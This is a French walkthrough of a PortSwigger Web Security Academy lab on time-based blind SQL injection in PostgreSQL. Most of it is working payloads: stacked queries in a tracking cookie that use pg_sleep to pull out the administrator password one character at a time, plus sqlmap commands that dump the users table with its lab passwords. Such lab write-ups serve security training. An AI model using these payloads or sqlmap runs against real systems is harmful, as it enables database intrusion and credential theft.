# Lab

https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval

## Exploit

`sqlmap -u https://0aa2007a045965b6842b956000a10022.web-security-academy.net/ --cookie="TrackingId=0Hf3ym7MMqzijjRC" --level=2`

```sql
Parameter: TrackingId (Cookie)
    Type: stacked queries
    Title: PostgreSQL > 8.1 stacked queries (comment)
    Payload: TrackingId=0Hf3ym7MMqzijjRC';SELECT PG_SLEEP(5)--
```

Vérifier que l'utilisateur `administrator` existe:

```sql
TrackingId=0Hf3ym7MMqzijjRC'%3b SELECT CASE WHEN (username='administrator') THEN pg_sleep(1) ELSE pg_sleep(0) END FROM users--
```

Trouver la taille du mot de passe de l'utilisateur `administrator`:

```sql
TrackingId=0Hf3ym7MMqzijjRC'%3b SELECT CASE WHEN (LENGTH(password)=20) THEN pg_sleep(1) ELSE pg_sleep(0) END FROM users WHERE username='administrator'--
```

Le mot de passe de l'utilisateur `administrator` est de 20 caractères.

Trouver le caractère à la position 1 du mot de passe de l'utilisateur `administrator`:

```sql
TrackingId=0Hf3ym7MMqzijjRC'%3b SELECT CASE WHEN (SUBSTRING(password,1,1)='1') THEN pg_sleep(1) ELSE pg_sleep(0) END FROM users WHERE username='administrator'--
```

Le caractère à la position 1 du mot de passe de l'utilisateur `administrator` est `1`.

Trouver le caractère à la position 2 du mot de passe de l'utilisateur `administrator`:

```sql
TrackingId=0Hf3ym7MMqzijjRC'%3b SELECT CASE WHEN (SUBSTRING(password,2,1)='5') THEN pg_sleep(1) ELSE pg_sleep(0) END FROM users WHERE username='administrator'--
```

Et ainsi de suite jusqu'à trouver le mot de passe complet de l'utilisateur `administrator` qui est `159rhz8ey1awjh4slmjw`.

Nous pouvons aussi utiliser `sqlmap` pour trouver le mot de passe de l'utilisateur `administrator`:

```bash
$ sqlmap -u https://0aa2007a045965b6842b956000a10022.web-security-academy.net/ --cookie="TrackingId=0Hf3ym7MMqzijjRC" --level=2 --dbs --batch
[...]
$ sqlmap -u https://0aa2007a045965b6842b956000a10022.web-security-academy.net/ --cookie="TrackingId=0Hf3ym7MMqzijjRC" --level=2 -D users --tables --batch
[...]
$ sqlmap -u https://0aa2007a045965b6842b956000a10022.web-security-academy.net/ --cookie="TrackingId=0Hf3ym7MMqzijjRC" --level=2 -D users -T users --dump --batch
Database: public
Table: users
[3 entries]
+---------------+----------------------+
| username      | password             |
+---------------+----------------------+
| administrator | 159rhz8ey1awjh4slmjw |
| carlos        | 9gtjenpqg9crjsqp44bn |
| wiener        | l04p4qmwrni9im6tl6l3 |
+---------------+----------------------+
```
